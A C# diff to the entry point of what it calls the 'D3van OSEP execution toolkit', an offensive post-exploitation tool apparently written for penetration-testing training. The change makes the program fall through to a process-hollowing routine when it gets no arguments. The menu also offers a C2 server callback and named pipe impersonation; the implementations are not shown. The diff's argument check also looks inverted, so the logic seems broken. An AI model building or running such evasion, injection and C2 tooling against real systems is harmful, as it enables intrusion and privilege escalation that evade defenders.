@@ -7,16 +7,19 @@ namespace Run
         public static void Main(string[] args)
         {
             string arg = "";
-            if (args.Length < 1)
+            if (args.Length > 1)
+            {
+                arg = args[0];
+            }
+            else Execution.Func.EvasiveExecution.ProcessHollowingExec();
+
+            if (arg.Equals("help"))
             {
                 Console.WriteLine("######### D3van OSEP execution toolkit ##########");
                 Console.WriteLine("Argument Needed:");
                 Console.WriteLine("~exec~ to call c2 server");
+                Console.WriteLine("~hollow~ to exec process hollowing");
                 Console.WriteLine("~pipe~ to launch named pipe impersonation");
-            }
-            else
-            {
-                arg = args[0];
             }
 
             if (arg.Equals("exec"))
@@ -40,7 +43,6 @@ namespace Run
                     Execution.Func.NamedPipeImpersonation.CreatePipe(args[1]);
                 }                
             }
-            
         }
     }
 }
